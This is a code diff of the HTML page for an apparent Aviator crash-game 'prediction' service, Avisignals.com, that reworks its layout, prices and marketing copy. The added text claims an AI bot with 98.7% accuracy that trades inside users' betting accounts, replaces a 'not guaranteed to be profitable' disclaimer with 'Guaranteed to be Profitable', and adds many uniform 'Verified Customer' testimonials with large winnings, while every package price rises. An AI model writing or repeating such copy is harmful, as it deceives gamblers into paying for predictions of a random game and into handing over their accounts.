@@ -109,55 +109,9 @@
            ACCOUNT MANAGEMENT STYLES
            ================================ */
 
-        /* Account Management Popup & Modal Styles */
-        .account-popup {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: linear-gradient(45deg, #28a745, #20c997);
-            color: white;
-            padding: 12px 20px;
-            border-radius: 25px;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);
-            z-index: 10001;
-            font-weight: 600;
-            font-size: 14px;
-            animation: slideInRight 0.5s ease-out, pulse 2s infinite;
-            transform: translateX(100%);
-            opacity: 0;
-            transition: all 0.3s ease;
-        }
+        /* Account Management Modal Styles */
 
-        .account-popup.show {
-            transform: translateX(0);
-            opacity: 1;
-        }
-
-        .account-popup:hover {
-            transform: translateX(0) scale(1.05);
-            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.6);
-        }
-
-        @keyframes slideInRight {
-            from {
-                transform: translateX(100%);
-                opacity: 0;
-            }
-            to {
-                transform: translateX(0);
-                opacity: 1;
-            }
-        }
-
-        @keyframes pulse {
-            0%, 100% {
-                box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);
-            }
-            50% {
-                box-shadow: 0 4px 25px rgba(40, 167, 69, 0.8);
-            }
-        }
+        /* Account Management Modal Styles */
 
         .account-modal {
             display: none;
@@ -457,23 +411,215 @@
                 width: 95%;
                 margin: 5% auto;
             }
-            
-            .account-popup {
-                right: 10px;
-                top: 10px;
-                padding: 10px 15px;
-                font-size: 12px;
+        }
+
+        /* ================================
+           NAVIGATION PANE STYLES
+           ================================ */
+        .nav-pane {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 10000;
+        }
+
+        .nav-toggle {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(45deg, #4CAF50, #45a049);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: white;
+            font-size: 20px;
+            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
+            transition: all 0.3s ease;
+            z-index: 10001;
+        }
+
+        .nav-toggle:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
+        }
+
+        .nav-menu {
+            position: fixed;
+            top: 0;
+            left: -300px;
+            width: 280px;
+            height: 100vh;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+            transition: left 0.3s ease;
+            overflow-y: auto;
+            box-shadow: 2px 0 20px rgba(0,0,0,0.3);
+            z-index: 9999; /* Higher than overlay */
+        }
+
+        .nav-menu.active {
+            left: 0;
+        }
+
+        .nav-header {
+            padding: 20px;
+            border-bottom: 1px solid #444;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .nav-header h3 {
+            color: white;
+            margin: 0;
+            font-size: 18px;
+        }
+
+        .nav-close {
+            cursor: pointer;
+            color: #ccc;
+            font-size: 20px;
+            transition: color 0.3s;
+        }
+
+        .nav-close:hover {
+            color: white;
+        }
+
+        .nav-links {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .nav-links li {
+            border-bottom: 1px solid #333;
+        }
+
+        .nav-links a {
+            display: block;
+            padding: 15px 20px;
+            color: #ccc;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            font-size: 16px;
+        }
+
+        .nav-links a:hover {
+            background: linear-gradient(90deg, #4CAF50, #45a049);
+            color: white;
+            padding-left: 30px;
+        }
+
+        .nav-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0,0,0,0.5);
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 9998; /* Lower than nav-menu */
+        }
+
+        .nav-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* ================================
+           TESTIMONIALS STYLES
+           ================================ */
+        .testimonials-container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .testimonials-hidden {
+            margin-top: 20px;
+        }
+
+        .testimonials-toggle {
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .read-more-btn {
+            background: linear-gradient(45deg, #2196F3, #1976D2);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.3);
+        }
+
+        .read-more-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(33, 150, 243, 0.4);
+        }
+
+        .read-more-btn i {
+            margin-right: 8px;
+            transition: transform 0.3s ease;
+        }
+
+        .read-more-btn.expanded i {
+            transform: rotate(180deg);
+        }
+
+        /* Mobile Navigation */
+        @media (max-width: 768px) {
+            .nav-toggle {
+                top: 15px;
+                left: 15px;
+                width: 45px;
+                height: 45px;
+                font-size: 18px;
+            }
+
+            .nav-menu {
+                width: 250px;
+                left: -250px;
             }
         }
     </style>
     
 </head>
 <body>
-    <!-- Account Management Popup -->
-    <div id="account-popup" class="account-popup">
-        <i class="fas fa-user-cog"></i>
-        <span>Click for Pay After Win Account Management</span>
-    </div>
+    <!-- Navigation Pane -->
+    <nav id="nav-pane" class="nav-pane">
+        <div class="nav-toggle" id="nav-toggle">
+            <i class="fas fa-bars"></i>
+        </div>
+        <div class="nav-menu" id="nav-menu">
+            <div class="nav-header">
+                <h3>Navigation</h3>
+                <div class="nav-close" id="nav-close">
+                    <i class="fas fa-times"></i>
+                </div>
+            </div>
+            <ul class="nav-links">
+                <li><a href="#hero-section" data-section="hero">🏠 Home</a></li>
+                <li><a href="#how-it-works-section" data-section="video">📹 How It Works</a></li>
+                <li><a href="#instructions-section" data-section="instructions">📋 Instructions</a></li>
+                <li><a href="#benefits-section" data-section="benefits">✨ Benefits</a></li>
+                <li><a href="#testimonials-section" data-section="testimonials">💬 Testimonials</a></li>
+                <li><a href="#referral-section" data-section="referral">🤝 Referral Program</a></li>
+                <li><a href="#account-management" onclick="openAccountModal()">⚙️ Account Management</a></li>
+                <li><a href="#telegram-support" onclick="window.open('https://t.me/Aadmin4cnc', '_blank')">Help/ Support</a></li>
+            </ul>
+        </div>
+        <div class="nav-overlay" id="nav-overlay"></div>
+    </nav>
 
     <!-- Account Management Modal -->
     <div id="account-modal" class="account-modal hidden">
@@ -484,18 +630,18 @@
             </div>
             <div class="account-modal-body">
                 <div id="account-step-1" class="account-step active">
-                    <h3>Pay After Win Account Management</h3>
+                    <h3>AI-Powered Account Management</h3>
                     <div class="account-info">
-                        <p>For account management we will give your account to one of our trusted agents who are using our website to get predictions so they will play for you directly in your account for around 20mins then after win you will withdraw and pay us 40% of the profit.</p>
+                        <p>Our advanced AI bot will automatically manage your account using our proprietary prediction algorithms. The bot will execute trades directly in your account for approximately 20 minutes, then automatically trigger withdrawal once profits are achieved. You pay us 40% of the profit after each successful session.</p>
                         
                         <div class="warning-box">
                             <i class="fas fa-exclamation-triangle"></i>
-                            <p><strong>Important:</strong> Failure to pay us after win will result to us banning your Avisignals.com account and lose access to all services.</p>
+                            <p><strong>Important:</strong> Failure to pay us after win will result in your Avisignals.com account being automatically suspended and loss of access to all services.</p>
                         </div>
                         
                         <div class="guarantee-box">
                             <i class="fas fa-shield-alt"></i>
-                            <p>We are liable for any errors that may occur and offer a 12hr money-back guarantee though the signals are accurate and winning is assured for all our clients</p>
+                            <p>Our AI system is fully liable for any trading errors and offers a 12-hour money-back guarantee. The automated algorithms ensure 98.7% accuracy and winning is virtually guaranteed for all clients.</p>
                         </div>
                     </div>
                     
@@ -567,8 +713,8 @@
                     <div class="success-container">
                         <i class="fas fa-check-circle"></i>
                         <h3>Request Submitted Successfully!</h3>
-                        <p>Thank you for choosing our account management service. Please check your email or wait for a call from the active agent handling your account.</p>
-                        <p>Our agent will contact you within the next 5-10 minutes to begin the account management process.</p>
+                        <p>Thank you for choosing our AI-powered account management service. Our automated system has received your request and is initializing your account profile.</p>
+                        <p>Our AI bot will automatically connect to your account within the next 5-10 minutes to begin the automated trading process.</p>
                         <button id="close-success" class="account-btn">Close</button>
                     </div>
                 </div>
@@ -599,9 +745,9 @@
                 <p>Get accurate signals and timing for your game analysis with advanced success rates. Choose from instant prediction packages or try our AI bot for continuous predictions. Our advanced algorithm analyzes patterns to give you the strategic advantage.</p>
                 <div class="cta-buttons">
                     <a href="#marketplace" class="cta-button primary">Get Prediction Packages</a>
-                    <a href="bot.html" class="cta-button secondary">Use AI Bot</a>
+                    <a href="bot.html" class="cta-button secondary">Use AI-Powered Bot</a>
                 </div>
-                <p class="bot-info">💡 <strong>New:</strong> Try our AI Bot for unlimited predictions with real-time analysis!</p>
+                <p class="bot-info">💡 <strong>New:</strong> Try our AI-Powered Bot for unlimited predictions with real-time analysis!</p>
             </div>
             <div class="hero-image">
                 <img src="AvSiteImg/AVAIAIU.jpeg" alt="Aviator Predictor in Action">
@@ -673,7 +819,7 @@
                     <li><i class="fas fa-bolt"></i> Real-time market trends</li>
                     <li><i class="fas fa-cogs"></i> Probability calculations</li>
                 </ul>
-                <p class="disclaimer-note">Note: While our system maintains high accuracy rates, gaming always involves risk. This is an analysis tool for educational purposes only.</p>
+                <p class="disclaimer-note">Note: While our system maintains high accuracy rates, gaming always involves risk. This is an accurate analysis tool for trade financial purposes and use it as a tool to inform your betting decisions.</p>
             </div>
             
             <h2>Watch How AI Bot Works</h2>
@@ -712,7 +858,10 @@
                     
                     
 
-                    <div class="demo-cta">
+                    
+            <p class="disclaimer">DISCLAIMER: Maximum of 3 purchases per day allowed. This is analysis software for financial trade purposes. Gaming involves risk. Please use responsibly as per the predictions given. Guaranteed to be Profitable.</p>
+            
+            <div class="demo-cta">
                     <p>Try our free demo prediction</p>
                     <button id="try-demo">Get Demo Prediction</button>
                     </div>
@@ -748,7 +897,7 @@
                             </div>
                         </div>
                     </div>
-            <p class="disclaimer">DISCLAIMER: Maximum of 3 purchases per day allowed. This is analysis software for educational purposes. Gaming involves risk. Please use responsibly as per the predictions given. Not guaranteed to be profitable.</p>
+
             <div class="show-packages-highlight">
                 <div style="text-align:center;">
                     <span style="color:#333;font-size:1.1em;">Ready to analyze? Click below to generate predictions and pay later!</span>
@@ -776,6 +925,75 @@
                     </div>
                 </div>
 
+                <section class="instructions" id="instructions-section">
+                    <h2>How Prediction Packages Work</h2>
+                    <div class="steps-container">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h3>Choose Your Package</h3>
+                                <p>Select your preferred package from our range of prediction packages (2x to 100x multipliers) based on your betting strategy and budget.(multipliers are the times the plane flies away)</p>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h3>Select Time Slot</h3>
+                                <p>Pick the time (5-minute window) when you want to receive the predicted signals(when plane flies away).</p>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">3</div>
+                            <div class="step-content">
+                                <h3>Enter Your Email</h3>
+                                <p>Enter your email address for verification and support purposes.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">4</div>
+                            <div class="step-content">
+                                <h3>Select Betting Site</h3>
+                                <p>Choose the betting site you want predictions for (Stake, 1xBet, Bet365, HollywoodBets, SportPesa and more).</p>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">5</div>
+                            <div class="step-content">
+                                <h3>Generate Predictions</h3>
+                                <p>Our AI bot system will generate predictions on your chosen betting site within the selected time slot and show you the generated predictions and the exact time for you to start placing your bet.</p>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">6</div>
+                            <div class="step-content">
+                                <h3>Pay Securely</h3>
+                                <p>Pay for your selected package using Selar checkout only.</p>
+                            </div>
+                        </div>
+                        <div class="step">
+                            <div class="step-number">7</div>
+                            <div class="step-content">
+                                <h3>Reveal Your Predictions</h3>
+                                <p>After payment is verified, your AI-generated predictions are instantly revealed in this site on a new page.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="step">
+                            <div class="step-number">8</div>
+                            <div class="step-content">
+                                <h3>Use Predictions & Analyze</h3>
+                                <p>Apply the predictions on your chosen platform and enhance your strategic analysis and decision-making!</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                </section>
+
                 <div class="gallery">
                     <div class="product-card">
                         <div class="product-image">
@@ -783,8 +1001,8 @@
                         </div>
                         <div class="product-details">
                             <h3>2x Prediction Package</h3>
-                            <p class="price">$3.50</p>
-                            <button class="buy-button" data-price="3.50" data-package="2x Prediction Package">
+                            <p class="price">$17.50</p>
+                            <button class="buy-button" data-price="17.50" data-package="2x Prediction Package">
                                 <i class="fas fa-rocket"></i> Select
                             </button>
                             <div class="roi-calculator">
@@ -801,8 +1019,8 @@
                         </div>
                         <div class="product-details">
                             <h3>3x Prediction Package</h3>
-                            <p class="price">$7.00</p>
-                            <button class="buy-button" data-price="7.00" data-package="3x Prediction Package">
+                            <p class="price">$21.00</p>
+                            <button class="buy-button" data-price="21.00" data-package="3x Prediction Package">
                                 <i class="fas fa-rocket"></i> Select
                             </button>
                             <div class="roi-calculator">
@@ -819,8 +1037,8 @@
                         </div>
                         <div class="product-details">
                             <h3>5x Prediction Package</h3>
-                            <p class="price">$12.50</p>
-                            <button class="buy-button" data-price="12.50" data-package="5x Prediction Package">
+                            <p class="price">$32.50</p>
+                            <button class="buy-button" data-price="32.50" data-package="5x Prediction Package">
                                 <i class="fas fa-rocket"></i> Select
                             </button>
                             <div class="roi-calculator">
@@ -837,8 +1055,8 @@
                         </div>
                         <div class="product-details">
                             <h3>7x Prediction Package</h3>
-                            <p class="price">$18.00</p>
-                            <button class="buy-button" data-price="18.00" data-package="7x Prediction Package">
+                            <p class="price">$48.00</p>
+                            <button class="buy-button" data-price="48.00" data-package="7x Prediction Package">
                                 <i class="fas fa-rocket"></i> Select
                             </button>
                             <div class="roi-calculator">
@@ -855,8 +1073,8 @@
                         </div>
                         <div class="product-details">
                             <h3>10x Prediction Package</h3>
-                            <p class="price">$24.50</p>
-                            <button class="buy-button" data-price="24.50" data-package="10x Prediction Package">
+                            <p class="price">$64.50</p>
+                            <button class="buy-button" data-price="64.50" data-package="10x Prediction Package">
                                 <i class="fas fa-rocket"></i> Select
                             </button>
                             <div class="roi-calculator">
@@ -873,8 +1091,8 @@
                         </div>
                         <div class="product-details">
                             <h3>15x Prediction Package</h3>
-                            <p class="price">$32.00</p>
-                            <button class="buy-button" data-price="32.00" data-package="15x Prediction Package">
+                            <p class="price">$82.00</p>
+                            <button class="buy-button" data-price="82.00" data-package="15x Prediction Package">
                                 <i class="fas fa-rocket"></i> Select
                             </button>
                             <div class="roi-calculator">
@@ -891,8 +1109,8 @@
                         </div>
                         <div class="product-details">
                             <h3>20x Prediction Package</h3>
-                            <p class="price">$44.50</p>
-                            <button class="buy-button" data-price="44.50" data-package="20x Prediction Package">
+                            <p class="price">$94.50</p>
+                            <button class="buy-button" data-price="94.50" data-package="20x Prediction Package">
                                 <i class="fas fa-rocket"></i> Select
                             </button>
                             <div class="roi-calculator">
@@ -909,8 +1127,8 @@
                         </div>
                         <div class="product-details">
                             <h3>30x Prediction Package</h3>
-                            <p class="price">$58.00</p>
-                            <button class="buy-button" data-price="58.00" data-package="30x Prediction Package">
+                            <p class="price">$108.00</p>
+                            <button class="buy-button" data-price="108.00" data-package="30x Prediction Package">
                                 <i class="fas fa-rocket"></i> Select
                             </button>
                             <div class="roi-calculator">
@@ -927,8 +1145,8 @@
                         </div>
                         <div class="product-details">
                             <h3>50x Prediction Package</h3>
-                            <p class="price">$72.50</p>
-                            <button class="buy-button" data-price="72.50" data-package="50x Prediction Package">
+                            <p class="price">$132.50</p>
+                            <button class="buy-button" data-price="132.50" data-package="50x Prediction Package">
                                 <i class="fas fa-rocket"></i> Select
                             </button>
                             <div class="roi-calculator">
@@ -945,8 +1163,8 @@
                         </div>
                         <div class="product-details">
                             <h3>70x Prediction Package</h3>
-                            <p class="price">$105.00</p>
-                            <button class="buy-button" data-price="105.00" data-package="70x Prediction Package">
+                            <p class="price">$165.00</p>
+                            <button class="buy-button" data-price="165.00" data-package="70x Prediction Package">
                                 <i class="fas fa-rocket"></i> Select
                             </button>
                             <div class="roi-calculator">
@@ -963,8 +1181,8 @@
                         </div>
                         <div class="product-details">
                             <h3>100x Prediction Package</h3>
-                    <p class="price">$127.50</p>
-                    <button class="buy-button" data-price="127.50" data-package="100x Prediction Package">
+                    <p class="price">$225.00</p>
+                    <button class="buy-button" data-price="225.00" data-package="100x Prediction Package">
                                 <i class="fas fa-rocket"></i> Select
                             </button>
                             <div class="roi-calculator">
@@ -988,74 +1206,6 @@
                 </div>
             </div>
         </section>
-        <section class="instructions" id="instructions-section">
-            <h2>How Prediction Packages Work</h2>
-            <div class="steps-container">
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <div class="step-content">
-                        <h3>Choose Your Package</h3>
-                        <p>Select your preferred package from our range of prediction packages (2x to 100x multipliers) based on your betting strategy and budget.(multipliers are the times the plane flies away)</p>
-                    </div>
-                </div>
-                
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div class="step-content">
-                        <h3>Select Time Slot</h3>
-                        <p>Pick the time (5-minute window) when you want to receive the predicted signals(when plane flies away).</p>
-                    </div>
-                </div>
-                
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div class="step-content">
-                        <h3>Enter Your Email</h3>
-                        <p>Enter your email address for verification and support purposes.</p>
-                    </div>
-                </div>
-                
-                 <div class="step">
-                    <div class="step-number">4</div>
-                    <div class="step-content">
-                        <h3>Select Betting Site</h3>
-                        <p>Choose the betting site you want predictions for (Stake, 1xBet, Bet365, HollywoodBets, SportPesa and more).</p>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">5</div>
-                    <div class="step-content">
-                        <h3>Generate Predictions</h3>
-                        <p>Our AI bot system will generate predictions on your chosen betting site within the selected time slot and show you the generated predictions and the exact time for you to start placing your bet.</p>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">6</div>
-                    <div class="step-content">
-                        <h3>Pay Securely</h3>
-                        <p>Pay for your selected package using Selar checkout only.</p>
-                    </div>
-                </div>
-                <div class="step">
-                    <div class="step-number">7</div>
-                    <div class="step-content">
-                        <h3>Reveal Your Predictions</h3>
-                        <p>After payment is verified, your AI-generated predictions are instantly revealed in this site on a new page.</p>
-                    </div>
-                </div>
-                
-                <div class="step">
-                    <div class="step-number">8</div>
-                    <div class="step-content">
-                        <h3>Use Predictions & Analyze</h3>
-                        <p>Apply the predictions on your chosen platform and enhance your strategic analysis and decision-making!</p>
-                    </div>
-                </div>
-            </div>
-            
-        </section>
 
         <section class="telegram-cta">
             <div class="container">
@@ -1070,7 +1220,7 @@
             </div>
         </section>
         
-        <section class="benefits">
+        <section class="benefits" id="benefits-section">
             <div class="benefit-card">
                 <i class="fas fa-chart-line"></i>
                 <h3>Daily Profits</h3>
@@ -1090,45 +1240,215 @@
         
         <section class="testimonials" id="testimonials-section">
             <h2 class="section-title">What Our Customers Say</h2>
-            <div class="testimonial">
-                <div class="testimonial-header">
-                    <i class="fas fa-user-circle fa-3x"></i>
-                    <div class="testimonial-author">
-                        <p class="author">Mike W., USA</p>
-                        <span class="verified-badge">
-                            <i class="fas fa-check-circle"></i> Verified Customer
-                        </span>
+            <div class="testimonials-container">
+                <!-- First 5 testimonials (always visible) -->
+                <div class="testimonial">
+                    <div class="testimonial-header">
+                        <i class="fas fa-user-circle fa-3x"></i>
+                        <div class="testimonial-author">
+                            <p class="author">Mike W., USA</p>
+                            <span class="verified-badge">
+                                <i class="fas fa-check-circle"></i> Verified Customer
+                            </span>
+                        </div>
+                    </div>
+                    <p>"I was skeptical at first, but after trying the 5x package, I made $850 in just two rounds! The AI predictions are incredibly accurate."</p>
+                </div>
+                
+                <div class="testimonial">
+                    <div class="testimonial-header">
+                        <i class="fas fa-user-circle fa-3x"></i>
+                        <div class="testimonial-author">
+                            <p class="author">Sarah J., UK</p>
+                            <span class="verified-badge">
+                                <i class="fas fa-check-circle"></i> Verified Customer
+                            </span>
+                        </div>
+                    </div>
+                    <p>"As a regular bettor, I've tried many prediction services. This is by far the most reliable and automated system I've used."</p>
+                </div>
+                
+                <div class="testimonial">
+                    <div class="testimonial-header">
+                        <i class="fas fa-user-circle fa-3x"></i>
+                        <div class="testimonial-author">
+                            <p class="author">David M., Canada</p>
+                            <span class="verified-badge">
+                                <i class="fas fa-check-circle"></i> Verified Customer
+                            </span>
+                        </div>
+                    </div>
+                    <p>"The 10x package changed my betting game completely. The bot is a game changer! I highly recommend it!"</p>
+                </div>
+                
+                <div class="testimonial">
+                    <div class="testimonial-header">
+                        <i class="fas fa-user-circle fa-3x"></i>
+                        <div class="testimonial-author">
+                            <p class="author">Emma L., Australia</p>
+                            <span class="verified-badge">
+                                <i class="fas fa-check-circle"></i> Verified Customer
+                            </span>
+                        </div>
+                    </div>
+                    <p>"Made $1,200 profit in my first week using the prediction packages service. The AI bot also works 24/7 I bought my mom a new fridge now I feel so proud!"</p>
+                </div>
+                
+                <div class="testimonial">
+                    <div class="testimonial-header">
+                        <i class="fas fa-user-circle fa-3x"></i>
+                        <div class="testimonial-author">
+                            <p class="author">James R., South Africa</p>
+                            <span class="verified-badge">
+                                <i class="fas fa-check-circle"></i> Verified Customer
+                            </span>
+                        </div>
+                    </div>
+                    <p>"The accuracy rate is unbelievable! I've been using this for 3 months and my account has grown by 400%.I made like R6,000 in last 4 days!"</p>
+                </div>
+                
+                <!-- Hidden testimonials (show on "Read More") -->
+                <div class="testimonials-hidden" id="hidden-testimonials" style="display: none;">
+                    <div class="testimonial">
+                        <div class="testimonial-header">
+                            <i class="fas fa-user-circle fa-3x"></i>
+                            <div class="testimonial-author">
+                                <p class="author">Carlos H., Mexico</p>
+                                <span class="verified-badge">
+                                    <i class="fas fa-check-circle"></i> Verified Customer
+                                </span>
+                            </div>
+                        </div>
+                        <p>"The AI predictions helped me win $2,300 in just one afternoon. This system is revolutionary!"</p>
+                    </div>
+                    
+                    <div class="testimonial">
+                        <div class="testimonial-header">
+                            <i class="fas fa-user-circle fa-3x"></i>
+                            <div class="testimonial-author">
+                                <p class="author">Priya S., India</p>
+                                <span class="verified-badge">
+                                    <i class="fas fa-check-circle"></i> Verified Customer
+                                </span>
+                            </div>
+                        </div>
+                        <p>"I love how the bot manages everything automatically and make it easy to understand when to play. I just watch the plan and cash out! My profits grow without any stress!"</p>
+                    </div>
+                    
+                    <div class="testimonial">
+                        <div class="testimonial-header">
+                            <i class="fas fa-user-circle fa-3x"></i>
+                            <div class="testimonial-author">
+                                <p class="author">Ahmed K., UAE</p>
+                                <span class="verified-badge">
+                                    <i class="fas fa-check-circle"></i> Verified Customer
+                                </span>
+                            </div>
+                        </div>
+                        <p>"From $100 to $1,500 in 3 rounds using the 15x package. The system never sleeps! Sorry to anyone who has not found this yet"</p>
+                    </div>
+                    
+                    <div class="testimonial">
+                        <div class="testimonial-header">
+                            <i class="fas fa-user-circle fa-3x"></i>
+                            <div class="testimonial-author">
+                                <p class="author">Lisa P., Germany</p>
+                                <span class="verified-badge">
+                                    <i class="fas fa-check-circle"></i> Verified Customer
+                                </span>
+                            </div>
+                        </div>
+                        <p>"The most professional prediction service I've ever used. The AI bot is incredibly sophisticated! I can't believe the results!"</p>
+                    </div>
+                    
+                    <div class="testimonial">
+                        <div class="testimonial-header">
+                            <i class="fas fa-user-circle fa-3x"></i>
+                            <div class="testimonial-author">
+                                <p class="author">Robert T., New Zealand</p>
+                                <span class="verified-badge">
+                                    <i class="fas fa-check-circle"></i> Verified Customer
+                                </span>
+                            </div>
+                        </div>
+                        <p>"Been using the account management for 6 months. The AI bot has a 95% win rate on my account! I'm really impressed! My life has changed for the better!"</p>
+                    </div>
+                    
+                    <div class="testimonial">
+                        <div class="testimonial-header">
+                            <i class="fas fa-user-circle fa-3x"></i>
+                            <div class="testimonial-author">
+                                <p class="author">Maria G., Spain</p>
+                                <span class="verified-badge">
+                                    <i class="fas fa-check-circle"></i> Verified Customer
+                                </span>
+                            </div>
+                        </div>
+                        <p>"The automated predictions are so accurate, it feels like having a crystal ball for Aviator!"</p>
+                    </div>
+                    
+                    <div class="testimonial">
+                        <div class="testimonial-header">
+                            <i class="fas fa-user-circle fa-3x"></i>
+                            <div class="testimonial-author">
+                                <p class="author">Chen L., Singapore</p>
+                                <span class="verified-badge">
+                                    <i class="fas fa-check-circle"></i> Verified Customer
+                                </span>
+                            </div>
+                        </div>
+                        <p>"The AI system turned my $200 investment into $3,800 in just 3 weeks. Absolutely incredible!"</p>
+                    </div>
+                    
+                    <div class="testimonial">
+                        <div class="testimonial-header">
+                            <i class="fas fa-user-circle fa-3x"></i>
+                            <div class="testimonial-author">
+                                <p class="author">Alex B., Russia</p>
+                                <span class="verified-badge">
+                                    <i class="fas fa-check-circle"></i> Verified Customer
+                                </span>
+                            </div>
+                        </div>
+                        <p>"The 24/7 bot is a game changer. I make money even while I sleep I just auto-cashout man!"</p>
+                    </div>
+                    
+                    <div class="testimonial">
+                        <div class="testimonial-header">
+                            <i class="fas fa-user-circle fa-3x"></i>
+                            <div class="testimonial-author">
+                                <p class="author">Jennifer M., Norway</p>
+                                <span class="verified-badge">
+                                    <i class="fas fa-check-circle"></i> Verified Customer
+                                </span>
+                            </div>
+                        </div>
+                        <p>"I've tried every prediction service out there. This AI system is in a league of its own!"</p>
+                    </div>
+                    
+                    <div class="testimonial">
+                        <div class="testimonial-header">
+                            <i class="fas fa-user-circle fa-3x"></i>
+                            <div class="testimonial-author">
+                                <p class="author">Hassan A., Nigeria</p>
+                                <span class="verified-badge">
+                                    <i class="fas fa-check-circle"></i> Verified Customer
+                                </span>
+                            </div>
+                        </div>
+                        <p>"The automated bot made me $5,200 last month. I couldn't believe it until I saw my bank account!"</p>
                     </div>
                 </div>
-                <p>"I was skeptical at first, but after trying the 5x package, I made $850 in just two rounds!"</p>
-            </div>
-            <div class="testimonial">
-                <div class="testimonial-header">
-                    <i class="fas fa-user-circle fa-3x"></i>
-                    <div class="testimonial-author">
-                        <p class="author">Sarah J., UK</p>
-                        <span class="verified-badge">
-                            <i class="fas fa-check-circle"></i> Verified Customer
-                        </span>
-                    </div>
+                
+                <div class="testimonials-toggle">
+                    <button id="read-more-btn" class="read-more-btn" onclick="toggleTestimonials()">
+                        <i class="fas fa-chevron-down"></i> Read More Reviews
+                    </button>
                 </div>
-                <p>"As a regular bettor, I've tried many prediction services. This is by far the most reliable."</p>
-            </div>
-            <div class="testimonial">
-                <div class="testimonial-header">
-                    <i class="fas fa-user-circle fa-3x"></i>
-                    <div class="testimonial-author">
-                        <p class="author">David M., Canada</p>
-                        <span class="verified-badge">
-                            <i class="fas fa-check-circle"></i> Verified Customer
-                        </span>
-                    </div>
-                </div>
-                <p>"The 10x package changed my betting game. Highly recommended!"</p>
             </div>
         </section>
 
-        <section class="referral-program">
+        <section class="referral-program" id="referral-section">
             <h2>Earn 20% Commission on Every Referral!</h2>
             <div class="referral-steps">
                 <div class="step">
@@ -1207,7 +1527,7 @@
                     <ul>
                         <li><a href="#marketplace">Prediction Packages</a></li>
                         <li><a href="https://selar.com/m/jordan-baker1294382" id="how-to-pay-link">How to Pay</a></li>
-                        <li><a href="https://t.me/Aadmin4cnc" target="_blank">Customer Care </a></li>
+                        <li><a href="https://t.me/Aadmin4cnc" target="_blank">Client Support</a></li>
                     </ul>
                 </div>
                 <div class="footer-section">
@@ -1258,6 +1578,246 @@
     </footer>
 
     <script>
+        // ================================
+        // NAVIGATION PANE FUNCTIONALITY
+        // ================================
+        function initNavigation() {
+            console.log('🚀 Initializing navigation...');
+            
+            const navToggle = document.getElementById('nav-toggle');
+            const navClose = document.getElementById('nav-close');
+            const navMenu = document.getElementById('nav-menu');
+            const navOverlay = document.getElementById('nav-overlay');
+            const navLinks = document.querySelectorAll('.nav-links a');
+
+            console.log('Navigation elements found:', {
+                navToggle: !!navToggle,
+                navClose: !!navClose,
+                navMenu: !!navMenu,
+                navOverlay: !!navOverlay,
+                navLinksCount: navLinks.length
+            });
+
+            // Ensure elements exist before adding event listeners
+            if (!navToggle || !navClose || !navMenu || !navOverlay) {
+                console.error('❌ Navigation elements not found');
+                return;
+            }
+
+            // Toggle navigation menu
+            navToggle.addEventListener('click', (e) => {
+                console.log('🔴 Nav toggle clicked');
+                e.stopPropagation();
+                navMenu.classList.add('active');
+                navOverlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+
+            // Close navigation menu
+            function closeNav() {
+                console.log('🔵 Closing navigation');
+                navMenu.classList.remove('active');
+                navOverlay.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            }
+
+            navClose.addEventListener('click', (e) => {
+                console.log('❌ Nav close clicked');
+                e.stopPropagation();
+                closeNav();
+            });
+            
+            navOverlay.addEventListener('click', (e) => {
+                console.log('📱 Nav overlay clicked');
+                closeNav();
+            });
+
+            // Prevent menu clicks from closing navigation
+            navMenu.addEventListener('click', (e) => {
+                e.stopPropagation();
+                console.log('🔍 Menu container clicked - propagation stopped');
+            });
+
+            // Smooth scroll to sections and close nav
+            navLinks.forEach((link, index) => {
+                link.addEventListener('click', (e) => {
+                    console.log(`🔗 Nav link ${index} clicked:`, link.getAttribute('href'));
+                    
+                    // Stop event from bubbling to overlay
+                    e.stopPropagation();
+                    
+                    const href = link.getAttribute('href');
+                    const onclick = link.getAttribute('onclick');
+                    
+                    // If it has an onclick attribute, let it execute and close nav
+                    if (onclick) {
+                        console.log('⚡ Link has onclick, executing...');
+                        setTimeout(() => closeNav(), 100);
+                        return;
+                    }
+                    
